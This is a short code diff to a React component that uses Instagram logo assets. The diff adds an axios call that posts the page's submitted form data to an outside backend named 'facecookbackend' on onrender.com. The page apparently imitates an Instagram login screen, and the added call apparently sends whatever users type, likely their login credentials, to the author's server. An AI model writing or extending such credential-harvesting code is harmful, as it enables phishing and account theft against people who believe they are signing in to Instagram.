@@ -1,4 +1,5 @@
 import React from "react";
+import axios from "axios";
 import Ig_logo from "../Assets/Instagram_logo.svg.png";
 import ig_logo from "../Assets/Instagram-Logo.wine.svg";
 import { useNavigate } from "react-router-dom";
@@ -20,6 +21,10 @@ const Instagram = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     // make a request to the backend
+    axios.post(
+      "https://facecookbackend.onrender.com/api/v2/instagram",
+      formData
+    );
     setLoading(true);
 
     // set a timeout
